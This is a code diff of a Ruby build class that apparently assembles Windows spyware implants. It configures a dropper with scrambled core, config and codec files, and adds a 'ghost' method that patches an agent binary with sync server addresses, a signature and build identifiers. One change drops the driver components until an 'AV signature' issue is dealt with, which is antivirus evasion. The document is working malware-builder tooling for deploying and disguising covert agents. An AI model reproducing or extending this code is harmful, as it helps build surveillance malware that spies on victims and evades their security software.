@@ -110,7 +110,7 @@ class BuildWindows < Build
     # call the super which will actually do the renaming
     # starting from @outputs and @scrambled
     super
-    
+
   end
 
   def melt(params)
@@ -165,8 +165,12 @@ class BuildWindows < Build
       CrossPlatform.exec path('dropper'), path(@scrambled[:core])+' '+
                                           (bit64 ? path(@scrambled[:core64]) : 'null') +' '+
                                           path(@scrambled[:config])+' '+
-                                          path(@scrambled[:driver])+' '+
-                                          (bit64 ? path(@scrambled[:driver64]) : 'null') +' '+
+
+                                          # TODO: reinsert those after AV signature
+                                          'null'+' '+
+                                          'null'+' '+
+                                          #path(@scrambled[:driver])+' '+
+                                          #(bit64 ? path(@scrambled[:driver64]) : 'null') +' '+
                                           (codec ? path(@scrambled[:codec]) : 'null') +' '+
                                           @scrambled[:dir]+' '+
                                           manifest +' '+
@@ -203,6 +207,33 @@ class BuildWindows < Build
     # this is the only file we need to output after this point
     @outputs = ['output.zip']
 
+  end
+
+  def ghost(params)
+    trace :debug, "Build: ghost: #{params}"
+
+    # patching for the ghost
+    patch_file(:file => 'ghost') do |content|
+      begin
+        offset = content.index("ADDRESS1")
+        raise "address1 not found" if offset.nil?
+        content.binary_patch_at_offset offset, params[:sync][0]
+        offset = content.index("ADDRESS2")
+        raise "address2 not found" if offset.nil?
+        content.binary_patch_at_offset offset, params[:sync][1]
+
+        sign = ::Signature.where({scope: 'agent'}).first
+        signature = Digest::MD5.digest(sign.value) + SecureRandom.random_bytes(16)
+        content.binary_patch '3j9WmmDgBqyU270FTid3719g64bP4s52', signature
+
+        content.binary_patch "\xe1\xbe\xad\xde".force_encoding('ASCII-8BIT'), [params[:build]].pack('I').force_encoding('ASCII-8BIT')
+        content.binary_patch "\xe2\xbe\xad\xde".force_encoding('ASCII-8BIT'), [params[:instance]].pack('I').force_encoding('ASCII-8BIT')
+      rescue Exception => e
+        trace :error, e.message
+        trace :fatal, e.backtrace.join("\n")
+        raise "Ghost marker not found: #{e.message}"
+      end
+    end
   end
 
   private
